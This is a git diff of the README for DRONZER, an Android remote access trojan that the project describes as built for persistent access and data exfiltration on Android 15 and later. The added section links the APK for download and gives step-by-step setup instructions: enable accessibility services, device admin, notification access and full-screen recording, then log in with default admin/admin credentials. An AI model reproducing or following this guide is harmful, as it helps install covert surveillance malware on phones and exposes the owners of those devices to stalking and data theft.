@@ -16,7 +16,7 @@
 </div>
 
 # **DRONZER : Next-Gen Android RAT 🐺**
-DRONZER is an advanced Android Remote Administration Tool (RAT) engineered to stress-test the security architectures of Android 15 and later. While modern OS updates introduce "Private Spaces" and enhanced sandboxing, DRONZER explores the limits of persistent access, data exfiltration, and UI-layer exploitation for educational and red-teaming purposes.
+DRONZER is an advanced **open-source** Android Remote Administration Tool (RAT) engineered to stress-test the security architectures of Android 15 and later. While modern OS updates introduce "Private Spaces" and enhanced sandboxing, DRONZER explores the limits of persistent access, data exfiltration, and UI-layer exploitation for educational and red-teaming purposes.
 
 > [!WARNING] 
 
@@ -109,6 +109,22 @@ Redundant Uplinks: Automatically switches between Firebase and Discord if one en
   <br>
   <img src="assets/devicemanager.jpeg" width="300">
 </details>
+
+# **SETUP GUIDE**
+* Download latest apk version from [here](https://github.com/VintageAyu/DRONZER/releases/download/v6.0.0.7/DRONZER.apk).
+* Open the apk and it will redirect you to accessibility services, toggle it on. (always cross-check because it may show not working - in this case toggle off and on again)
+* Go back and it will ask you for device admin perms, allow it and it will ask you for permissions allow all, follow the steps
+* It will redirect you to read notification settings and all , go through it.
+* Once you finished setting up re-open the app , it will ask you for screen rec permission , select entire screen for Android 13+
+* A loading video will appear once finished a login page will appear, you can either login with default credentials `admin` `admin` or use biometric authentication.
+
+# **SETUP VIDEO**
+
+<div align="center">
+  <video src="assets/video/tutorial.mp4" width="100%" controls muted autoplay loop>
+    Your browser does not support the video tag.
+  </video>
+</div>
 
 ### Machine:
 <div display="flex">
